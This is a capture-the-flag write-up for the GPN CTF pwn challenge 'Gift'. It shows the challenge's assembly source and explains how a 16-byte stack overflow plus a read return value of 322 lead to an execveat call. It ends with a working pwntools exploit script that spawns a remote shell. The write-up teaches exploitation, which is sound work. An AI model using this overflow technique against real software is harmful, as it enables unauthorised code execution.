# Gift

|||
|-|-|
|  **CTF**  |  [GPN CTF](https://play.ctf.kitctf.de/) [(CTFtime)](https://ctftime.org/event/2257)  |
|  **Author** |  intrigus |
|  **Category** |  Pwning |
|  **Solves** |  9  |
| **Files** |  [gift.tar.gz](<gift.tar.gz>)  |

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/14a3d9c5-8cd7-4760-872d-ca4e7ca5ce5f)

# Solution

After unzipping, we get the source code of the challenge:

```s
.section .text
    .global _start

read_input:
    # Read 314 bytes + 16 free bytes from stdin to the stack
    sub $314, %rsp                # Make room for the input
    mov $0, %rax                  # System call number for read
    mov $0, %rdi                  # File descriptor for stdin
    mov %rsp, %rsi                # Address of the stack
    mov $330, %rdx                # Number of bytes to read
    syscall                       # Call the kernel
    add $314, %rsp                # Restore the stack pointer
    ret

_start:
    # Print the message to stdout
    mov $1, %rax                  # System call number for write
    mov $1, %rdi                  # File descriptor for stdout
    mov $message, %rsi            # Address of the message string
    mov $message_len, %rdx        # Length of the message string
    syscall                       # Call the kernel

    call read_input

    # Exit the program
    mov $60, %rax                 # System call number for exit
    xor %rdi, %rdi                # Exit status 0
    xor %rsi, %rsi                # I like it clean
    xor %rdx, %rdx                # I like it clean
    syscall                       # Call the kernel

message: .asciz "Today is a nice day so you get 16 bytes for free!\n"
message_len = . - message
```

The challenge is made in assembly. It does 3 main things:

1. Prints the message to stdout
2. Read input from the user
3. Exit the program

When reading our input, it gives 16 bytes extra as a gift. We can see that it subtracts 314 from rsp. We can send 330 bytes. This means that we have an overflow. We can hit the rip with 314 bytes.

So the size of rip is 8 bytes. Thus, we can send 314 + 8(this will be put in rip) = 322 bytes to control rip. The read syscall returns the amount it reads in rax. 
If we check what the syscall of 322/0x142 is, we see that it's `execveat`. With this, we can execute commands. At the ret of `read_input`, rsi still contains the address of our input. 
So we can put `/bin/sh` at the start of our buffer.

When we overflow and jump to the syscall gadget, we can see:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/bc221996-9e29-4cec-9d9c-86c85a5dcc98)

We see that rdx is not empty, so it will segfault. Luckily, there is a gadget that xors rdx before calling syscall. It's used when exiting the program (check the source above).

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/46423d1f-6fad-4fe3-9f08-53a043e89895)

So my final script looks like this:

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b *read_input+0x28
c
'''.format(**locals())

exe = './gift'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])

REMOTE = True

if REMOTE:
    io = start(ssl=True)
else:
    io = start()
    
payload = flat(
    b'/bin/sh\x00',
    b'A' * (314 - 8),
    0x401059
    )
io.sendafter(b'!\n', payload)

io.interactive()
```

If we run this on remote, we can get the flag:

![image](https://github.com/0xM4hm0ud/CTF-Writeups/assets/80924519/90f88cdc-eece-4502-bfdc-9c5ec867d497)



